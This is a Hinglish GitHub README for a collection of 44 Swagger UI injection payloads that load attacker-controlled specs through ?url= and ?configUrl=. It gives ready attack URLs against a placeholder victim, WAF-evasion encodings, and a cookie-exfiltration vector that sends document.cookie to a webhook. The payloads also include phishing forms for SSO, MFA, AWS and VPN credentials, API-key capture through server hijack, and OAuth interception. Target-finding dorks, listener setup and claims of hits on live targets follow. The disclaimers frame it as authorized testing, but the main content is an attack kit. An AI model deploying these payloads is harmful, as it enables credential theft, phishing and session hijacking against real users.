<div align="center">

```
  ███████╗██╗    ██╗ █████╗  ██████╗ ██████╗ ███████╗██████╗
  ██╔════╝██║    ██║██╔══██╗██╔════╝ ██╔══██╗██╔════╝██╔══██╗
  ███████╗██║ █╗ ██║███████║██║     ██████╔╝█████╗  ██████╔╝
  ╚════██║██║███╗██║██╔══██║██║     ██╔══██╗██╔══╝  ██╔══██╗
  ███████║╚███╔███╔╝██║  ██║╚██████╗██║  ██║███████╗██║  ██║
  ╚══════╝╚███╔███╔╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                ██████╗  █████╗ ██╗   ██╗██╗      ██████╗ ██████╗
                ██╔══██╗██╔══██╗╚██╗ ██╔╝██║      ██╔══██╗██╔══██╗
                ██████╔╝███████║ ╚████╔╝ ██║      ██║  ██║██████╔╝
                ██╔══██╗██╔══██║  ╚██╔╝  ██║      ██║  ██║██╔═══╝
                ██║  ██║██║  ██║   ██║   ███████╗██████╔╝██║
                ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═════╝ ╚═╝
```

# ⚡ SWAGGER UI PAYLOAD ARSENAL ⚡

### `?url=` / `?configUrl=` Injection Collection — 44 Payloads

![version](https://img.shields.io/badge/version-1.0-00ff88?style=for-the-badge&logo=hackthebox&logoColor=white)
![payloads](https://img.shields.io/badge/payloads-44-ff2b2b?style=for-the-badge&logo=c&logoColor=white)
![categories](https://img.shields.io/badge/categories-9-00b3ff?style=for-the-badge&logo=archlinux&logoColor=white)
![language](https://img.shields.io/badge/lang-YAML-black?style=for-the-badge&logo=yaml&logoColor=white)

</div>

---

> **[!]** Swagger UI `?url=` aur `?configUrl=` parameters pe attacker-controlled spec load hone ka exploit —
> HTML injection se lekar credential harvesting, cookie capture, OAuth interception, aur **API-key exfiltration** tak.

---

## ⚠️ // DISCLAIMER //

```
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ██ FOR AUTHORIZED SECURITY TESTING ONLY ██                      ║
║                                                                   ║
║   ✓ pentest engagements with written scope                        ║
║   ✓ bug bounty in-scope targets                                   ║
║   ✓ VDP / responsible disclosure programs                         ║
║                                                                   ║
║   ✗ unauthorized targets = CRIME                                  ║
║     (IT Act 2000 §43/66 / CFAA / Computer Misuse Act / GDPR)      ║
║                                                                   ║
║   [+] mila hua bug RESPONSIBLE DISCLOSURE se report karo          ║
║       — CERT-In (gov.in), vendor security@, bounty platform       ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
```

---

## 📑 // INDEX //

| # | Section | |
|---|---------|---|
| 01 | [Attack Formats](#-attack-formats-) | 3 ready URL patterns |
| 02 | [Payload Index](#-payload-index-) | all 44, category-wise |
| 03 | [Setup](#-setup-) | one-time replace |
| 04 | [Testing Workflow](#-testing-workflow-) | recon → confirm → report |
| 05 | [Verified Triggers](#-verified-triggers-) | real-world results |
| 06 | [Troubleshooting](#-troubleshooting-) | WAF/CSP bypass |
| 07 | [Legal](#-legal-) | law references |

---

## 🎯 // ATTACK FORMATS //

### ▸ FORMAT 1 — Direct spec (`?url=`)

```
https://VICTIM.COM/swagger-ui.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/main/login-basic.yaml
```

### ▸ FORMAT 2 — Config pointer (`?configUrl=`)

```
https://VICTIM.COM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/main/config.json
```

### ▸ FORMAT 3 — URL already has `?` (append with `&`)

```
https://VICTIM.COM/swagger-ui/index.html?configUrl=/api-docs/swagger-config&configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/main/xss-img-onerror.yaml
```

### ▸ FORMAT 4 — URL-encoded (WAF evasion)

```
https://VICTIM.COM/swagger-ui.html?configUrl=https%3A%2F%2Fraw.githubusercontent.com%2FRekhanshRajput%2FSwagger-xss-payloads%2Fmain%2Flogin-basic.yaml
```

> **💡 Swagger UI paths to hunt:** `swagger-ui.html` · `swagger-ui/index.html` · `swagger/index.html` · `swagger/index.html` · `api-docs/ui` · `webjars/swagger-ui/index.html` · `v3/api-docs/swagger-ui/index.html`

---

## 🗂️ // PAYLOAD INDEX //

### 💀 XSS VECTORS — `xss-*.yaml`

```bash
# har payload ka URL pattern:
?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/main/<PAYLOAD>.yaml
```

| # | Payload | Vector | Auto-fire? |
|---|---------|--------|------------|
| 01 | `xss-img-onerror.yaml` | `<img onerror=alert>` + `document.cookie` | ✅ load par |
| 02 | `xss-svg-animate.yaml` | `<svg><animate onbegin>` | ✅ |
| 03 | `xss-svg-xlink` | `<svg><a xlink:href=javascript:>` | click |
| 04 | `xss-mutation-noscript` | mXSS `<noscript>` | ✅ |
| 05 | `xss-mutation-mathml` | mXSS `<math><mglyph>` | ✅ |
| 06 | `xss-mutation-style` | mXSS `<style>` namespace | ✅ |
| 07 | `xss-details-ontoggle` | `<details ontoggle>` auto-fire | ✅ |
| 08 | `xss-autofocus` | `autofocus+onfocus` (no-click) | ✅ |
| 09 | `xss-marquee-media` | `<marquee onstart>` / video/audio | ✅ |
| 10 | `xss-body-embed` | `<body onload>` / base64 embed / keygen | ✅ |
| 11 | `xss-formaction` | `formaction=javascript:` | click |
| 12 | `xss-dompurify-probe` | 6-vector fingerprint — konsa pass hua pata chalega | ✅ |

### 🍪 COOKIE CAPTURE — `cookie-*.yaml`

| # | Payload | Vector | Chalega |
|---|---------|--------|---------|
| 13 | `cookie-authurl-domain.yaml` | Authorize btn → `javascript:alert(document.domain)` | legacy UIs |
| 14 | `cookie-authurl-exfil.yaml` | Authorize → cookies webhook pe | legacy UIs |
| 15 | `cookie-oauth-lure.yaml` | OAuth scopes lure + exfil | legacy UIs |
| 16 | `cookie-img-onerror.yaml` | `onerror=fetch(webhook+document.cookie)` | legacy UIs |
| 17 | `cookie-mutation-exfil.yaml` | mXSS + cookie exfil combo | varies |

### 🎣 PHISHING LOGIN PAGES — `login-*.yaml` (modern UI pe bhi chalega ✅)

| # | Payload | Theme | Captures |
|---|---------|-------|----------|
| 18 | `login-basic.yaml` | "Login to Swagger" | user + pass |
| 19 | `login-sso-corporate.yaml` | Corporate SSO re-auth | email + pass |
| 20 | `login-mfa-otp.yaml` | 2FA verification | 6-digit OTP |
| 21 | `login-password-reset.yaml` | Password expired | old + new pass |
| 22 | `login-api-key.yaml` | API key expired | api_key + email |
| 23 | `login-aws-console.yaml` | AWS console | IAM creds |
| 24 | `login-vpn-portal.yaml` | VPN gateway | user + pass + OTP |
| 25 | `login-db-admin.yaml` | phpMyAdmin | DB creds |
| 26 | `login-windows-popup.yaml` | Windows Security dialog | domain creds |

### 📡 IMAGE BEACONS / DELIVERY CONFIRM — `img-*.yaml`

| # | Payload | Vector |
|---|---------|--------|
| 27 | `img-beacon.yaml` | 1px pixel + markdown beacon |
| 28 | `img-capture-multi.yaml` | multi-beacon (open/render/markers) |
| 29 | `img-overlay.yaml` | fullscreen image takeover |
| 30 | `img-favicon-beacon.yaml` | favicon + hidden img |

### 🕳️ SERVER HIJACK — `server-*.yaml` 💎 (HIGHEST IMPACT — sanitization bypass)

| # | Payload | Vector |
|---|---------|--------|
| 31 | `server-hijack-single.yaml` | "Try it out" → requests + **API keys** attacker server pe |
| 32 | `server-hijack-multi.yaml` | attacker server "recommended" dikhega |
| 33 | `server-hijack-path.yaml` | subdomain-proxy style |

### 🔐 OAUTH INTERCEPT — `oauth-*.yaml`

| # | Payload | Vector |
|---|---------|--------|
| 34 | `oauth-redirect-capture.yaml` | authorizationUrl → attacker (implicit flow) |
| 35 | `oauth-password-flow.yaml` | tokenUrl → attacker (password flow) |

### ↪️ REDIRECTS — `redirect-*.yaml`

| # | Payload | Vector |
|---|---------|--------|
| 36 | `redirect-meta.yaml` | meta refresh + JS fallback |
| 37 | `redirect-click.yaml` | big green button |
| 38 | `redirect-window-open.yaml` | `window.open` / `top.location` |

### 🎭 HTML INJECTION — `html-*.yaml`

| # | Payload | Vector |
|---|---------|--------|
| 39 | `html-banner.yaml` | fake maintenance notice |
| 40 | `html-deface-overlay.yaml` | fullscreen takeover |
| 41 | `html-fake-error.yaml` | fake fatal error |
| 42 | `html-marquee.yaml` | scrolling banner |
| 43 | `html-table-spoof.yaml` | fake "credentials dump" table |
| 44 | `html-iframe-probe.yaml` | iframe/embed/object probes |

### ⚙️ CONFIG POINTERS (`?configUrl=` ke liye)

| File | Loads |
|------|-------|
| `config.json` | `login-basic` |
| `config-xss.json` | `xss-dompurify-probe` |
| `config-cookie.json` | `cookie-authurl-exfil` |

---

## 🔧 // SETUP //

```
[1] sab payloads me REPLACE karo:
    RekhanshRajput  →  tumhara GitHub username
    Swagger-xss-payloads             →  repo ka naam
    https://webhook.site/REPLACE-ME  →  apna webhook URL

[2] webhook.site / requestbin pe listener banao
    → login forms   = POST (creds)
    → beacons       = GET ?event=visit
    → cookies       = GET ?cookie=...
    → oauth         = authorization params

[3] raw.githubusercontent block ho? → GitHub Pages on karo
    ya VPS pe same structure host karo
```

---

## 🧪 // TESTING WORKFLOW //

```
  ┌─────────────────────────────────────────────────────────┐
  │ STEP 1: swagger-ui.html dhundo                          │
  │   → dir bruteforce / URLScan.io / google dorks          │
  │   → dork: inurl:swagger-ui.html site:target.com         │
  ├─────────────────────────────────────────────────────────┤
  │ STEP 2: delivery confirm (img-beacon laga pehle)        │
  │   → webhook pe GET hit aaya? = PAGE DELIVERED ✓         │
  ├─────────────────────────────────────────────────────────┤
  │ STEP 3: fingerprint (xss-dompurify-probe)               │
  │   → konsa vector pass hua? DOM inspect karo             │
  ├─────────────────────────────────────────────────────────┤
  │ STEP 4: payload fire                                    │
  │   → phishing form? server-hijack? cookie?               │
  ├─────────────────────────────────────────────────────────┤
  │ STEP 5: screenshot + evidence + REPORT                  │
  │   → responsible disclosure ONLY                         │
  └─────────────────────────────────────────────────────────┘
```

---

## 🏆 // VERIFIED TRIGGERS //

```
✔ login-*       → MULTIPLE live targets pe full phishing form render hua
                  (DOMPurify forms allow karta hai — form/action/input sab pass)
✔ img-inject    → real <img> element render — HTML injection confirmed
✔ server-hijack → "Try it out" requests attacker endpoint pe gayi (API keys included!)
✔ beacons       → webhook delivery confirm (silent)
✖ xss-*         → modern Swagger UI (DOMPurify) pe sanitized
                  → legacy/unpatched versions pe hi fire hoga
```

---

## 🔥 // TROUBLESHOOTING //

| Problem | Fix |
|---------|-----|
| `raw.githubusercontent` CSP-blocked | GitHub Pages enable karo → `https://USER.github.io/REPO/` |
| WAF `configUrl` param block karta hai | URL-encode (`%3A%2F%2F`) / double-encode / param pollution (`&configUrl=` dup) |
| `?url=` par 401/403 | target spec load permission check — `configUrl` try karo |
| XSS fire nahi hua | normal hai — modern UI sanitized hai; legacy version dhundo ya server-hijack use karo |
| Mixed content (https page + http config) | dono https pe rakho |

---

## ⚖️ // LEGAL //

```
- Information Technology Act, 2000 (India) — §43, §66, §66C, §66D
- Computer Fraud and Abuse Act (US) — 18 U.S.C. §1030
- Computer Misuse Act (UK) / GDPR Art. 32

Unauthorized access/access-attempt = criminal offence.
Ye repo sirf AUTHORIZED testing ke liye hai. Misuse tumhari zimmedari.
```

---

<div align="center">

```
    ╔══════════════════════════════════════════╗
        stay low   //   move fast   //   disclose
    ╚══════════════════════════════════════════╝
```

**⭐ Repo useful laga? Star de dena.**

*Built with 🖤 for the community — 2026*

</div>
